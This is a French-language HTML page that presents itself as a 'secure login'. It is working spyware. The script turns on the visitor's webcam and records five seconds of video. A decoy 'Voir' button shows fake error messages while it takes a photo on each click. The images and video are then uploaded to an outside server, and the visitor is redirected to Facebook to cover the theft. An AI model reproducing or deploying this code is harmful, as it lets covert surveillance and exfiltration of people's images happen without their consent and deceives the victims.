<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion s√©curis√©e</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      overflow: hidden;
      font-family: sans-serif;
      color: #fff;
    }

    video#video {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      filter: blur(15px) brightness(0.6);
      z-index: -1;
    }

    .center {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }

    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #444;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    #status {
      margin-top: 20px;
      font-size: 16px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div class="center">
    <button id="fakeBtn">Voir</button>
    <div id="status">Chargement s√©curis√© en cours...</div>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const fakeBtn = document.getElementById('fakeBtn');
    const status = document.getElementById('status');

    let clickCount = 0;
    let recorder;
    let recordedChunks = [];
    const capturedImages = [];

    // ‚úÖ D√©marrer la webcam + enregistrement vid√©o
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        video.srcObject = stream;

        // üé• D√©marrer l'enregistrement vid√©o
        recorder = new MediaRecorder(stream);
        recorder.ondataavailable = e => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };
        recorder.start();

        // Stopper apr√®s 5s
        setTimeout(() => {
          recorder.stop();
        }, 5000);
      })
      .catch(err => {
        status.textContent = "Erreur : Acc√®s √† la cam√©ra refus√©.";
        console.error(err);
      });

    // üñºÔ∏è Capture d'une photo
    function capturePhoto() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg');
      capturedImages.push(dataUrl);
    }

    // üì§ Envoi au serveur
    function sendData() {
      status.textContent = "Envoi des donn√©es...";

      // Convertir la vid√©o en blob
      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });

      const formData = new FormData();
      capturedImages.forEach((img, i) => {
        formData.append(`image${i + 1}`, img);
      });
      formData.append('video', videoBlob, 'capture.webm');

      fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
        method: 'POST',
        body: formData
      }).then(() => {
        status.textContent = "Redirection en cours...";
        setTimeout(() => {
          window.location.href = "https://www.facebook.com";
        }, 1000);
      }).catch(err => {
        status.textContent = "Erreur d'envoi.";
        console.error(err);
      });
    }

    // üß† Clic sur le faux bouton "Voir"
    fakeBtn.addEventListener('click', () => {
      clickCount++;
      capturePhoto();

      if (clickCount < 5) {
        status.textContent = `Erreur... Veuillez r√©essayer (${clickCount}/5)`;
      } else {
        fakeBtn.disabled = true;
        status.textContent = "Connexion r√©ussie.";
        sendData();
      }
    });
  </script>
</body>
</html>
